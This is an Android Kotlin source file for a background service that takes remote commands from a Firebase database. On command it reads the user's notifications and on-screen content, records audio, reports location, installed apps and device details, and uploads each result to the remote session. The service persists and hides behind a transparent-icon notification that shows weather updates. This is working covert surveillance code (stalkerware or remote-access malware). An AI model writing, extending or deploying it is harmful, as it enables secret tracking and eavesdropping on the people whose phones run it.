package com.jonas.x24.services

import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.jonas.x24.AudioRecordManager
import com.jonas.x24.services.x24AccessibilityService
import com.jonas.x24.services.x24NotificationService

class FirebaseCommandService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private var weatherUpdateJob: Job? = null
    private val WEATHER_UPDATE_INTERVAL = 30 * 60 * 1000L // 30 mins

    private lateinit var database: DatabaseReference
    private var sessionKey: String? = null
    private var listener: ValueEventListener? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        var key = intent?.getStringExtra("SESSION_KEY")

        if (key == null) {
            val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
            key = prefs.getString("SESSION_KEY", null)
        }

        if (key != null) {
            sessionKey = key
            setupFirebaseListener(key)
        }

        startWeatherUpdates()
        startForeground(1001, createNotification())
        return START_STICKY
    }

    private fun setupFirebaseListener(key: String) {
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(key)

        listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val commandsSnapshot = snapshot.child("commands")
                val lastCommandNode = commandsSnapshot.children.lastOrNull()

                if (lastCommandNode != null) {
                    val commandStr = lastCommandNode.child("command").value as? String
                    val processed = lastCommandNode.child("processed").value as? Boolean ?: false

                    if (commandStr != null && !processed) {
                        // Mark as processed immediately so we don't duplicate
                        lastCommandNode.ref.child("processed").setValue(true)
                        processCommand(commandStr)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseService", "Listener cancelled: ${error.message}")
            }
        }

        database.addValueEventListener(listener!!)
    }

    private fun processCommand(command: String) {
        Log.d("FirebaseService", "Received command: $command")
        val currentSessionKey = sessionKey ?: return

        when (command) {
            "READ_NOTIFICATIONS" -> readNotifications()
            "READ_SCREEN" -> readScreen()
            "START_RECORD_AUDIO" -> {
                AudioRecordManager.startRecording(this, currentSessionKey)
            }
            "STOP_RECORD_AUDIO" -> {
                AudioRecordManager.stopRecording(currentSessionKey)
            }
            "GET_LOCATION" -> getLocation()
            "GET_INSTALLED_APPS" -> getInstalledApps()
            "GET_DEVICE_STATS" -> getDeviceStats()
        }
    }

    private fun postResult(type: String, data: String) {
        val currentSessionKey = sessionKey ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    private fun getLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Location permissions denied")
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch(e: Exception) {
            Log.e("FirebaseService", "Location error", e)
        }

        if (location != null) {
            val geocoder = Geocoder(this, java.util.Locale.getDefault())
            try {
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    val address = addresses[0]
                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
                    return
                }
            } catch (e: Exception) { }
            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
        } else {
            postResult("ERROR", "Could not determine location")
        }
    }

    private fun readScreen() {
        val service = x24AccessibilityService.instance
        if (service != null) {
            val screenContext = service.getScreenContext()
            postResult("TEXT", "Screen Context:\n$screenContext")
        } else {
            postResult("ERROR", "Accessibility service not running")
        }
    }

    private fun getInstalledApps() {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val sb = java.lang.StringBuilder()
        for (appInfo in packages) {
            if (pm.getLaunchIntentForPackage(appInfo.packageName) != null) {
                val appName = pm.getApplicationLabel(appInfo).toString()
                sb.append("$appName (${appInfo.packageName})\n")
            }
        }
        postResult("TEXT", sb.toString().trim(), "GET_INSTALLED_APPS")
    }

    private fun getDeviceStats() {
        val sb = StringBuilder()

        // Device Info
        sb.append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")
        sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")

        // Uptime
        val uptimeMillis = android.os.SystemClock.elapsedRealtime()
        val uptimeHours = uptimeMillis / (1000 * 60 * 60)
        val uptimeMins = (uptimeMillis / (1000 * 60)) % 60
        sb.append("System Uptime: ${uptimeHours}h ${uptimeMins}m\n")

        // Battery Status
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
            registerReceiver(null, ifilter)
        }
        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = level * 100 / scale.toFloat()
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        sb.append("Battery: ${batteryPct.toInt()}% " + (if (isCharging) "(Charging)\n" else "(Not Charging)\n"))

        // RAM Status
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memoryInfo = android.app.ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memoryInfo)
        val availableRamGb = memoryInfo.availMem.toDouble() / (1024 * 1024 * 1024)
        val totalRamGb = memoryInfo.totalMem.toDouble() / (1024 * 1024 * 1024)
        sb.append(String.format(java.util.Locale.US, "RAM: %.2f GB / %.2f GB\n", availableRamGb, totalRamGb))

        // Storage Status
        try {
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            val availableBlocks = stat.availableBlocksLong
            val totalSpaceGb = (totalBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
            val availableSpaceGb = (availableBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
            sb.append(String.format(java.util.Locale.US, "Internal Storage: %.2f GB / %.2f GB\n", availableSpaceGb, totalSpaceGb))
        } catch (e: Exception) {
            sb.append("Internal Storage: Unknown\n")
        }

        // Network Status
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val capabilities = cm.getNetworkCapabilities(network)
        if (capabilities != null) {
            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                sb.append("Network: Connected (Wi-Fi)\n")
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                sb.append("Network: Connected (Cellular)\n")
            } else {
                sb.append("Network: Connected (Other)\n")
            }
        } else {
            sb.append("Network: Disconnected\n")
        }

        postResult("TEXT", sb.toString().trim(), "GET_DEVICE_STATS")
    }

    private fun postResult(type: String, data: String, command: String = "") {
        val currentSessionKey = sessionKey ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    private fun readNotifications() {
        val activeNotifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
        val recentNotifs = x24NotificationService.recentNotifications

        val builder = java.lang.StringBuilder()

        if (activeNotifs.isNotEmpty()) {
            builder.append("Active Notifications:\n")
            builder.append(activeNotifs.joinToString("\n"))
            builder.append("\n\n")
        } else {
            builder.append("No active notifications.\n\n")
        }

        if (recentNotifs.isNotEmpty()) {
            builder.append("Recent Notifications:\n")
            builder.append(recentNotifs.joinToString("\n"))
        } else {
            builder.append("No recent notifications.")
        }

        postResult("TEXT", builder.toString().trim())
    }

    private fun createNotification(title: String = "x24 Active", text: String = "Monitoring for commands..."): android.app.Notification {
        val channelId = "x24_monitor_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Monitor Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(com.jonas.x24.R.drawable.ic_transparent)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        weatherUpdateJob?.cancel()
        if (listener != null && ::database.isInitialized) {
            database.removeEventListener(listener!!)
        }
    }

    private fun startWeatherUpdates() {
        weatherUpdateJob = serviceScope.launch {
            while (true) {
                updateWeatherNotification()
                delay(WEATHER_UPDATE_INTERVAL)
            }
        }
    }

    private fun updateWeatherNotification() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var location: Location? = null

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {

                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (location == null) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                }
            }

            if (location != null) {
                val geocoder = Geocoder(this, java.util.Locale.getDefault())
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                val city = addresses?.firstOrNull()?.locality ?: "Unknown City"

                val retrofit = Retrofit.Builder()
                    .baseUrl("https://api.open-meteo.com/")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val api = retrofit.create(WeatherApi::class.java)
                val response = api.getCurrentWeather(location.latitude, location.longitude).execute()

                if (response.isSuccessful) {
                    val weather = response.body()?.current_weather
                    if (weather != null) {
                        val temp = weather.temperature
                        val title = "$city"
                        val text = "Temperature: $temp°C"

                        val notification = createNotification(title, text)
                        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                        notificationManager.notify(1001, notification)
                        return
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("x24", "Failed to update weather: ${e.message}")
        }
    }
}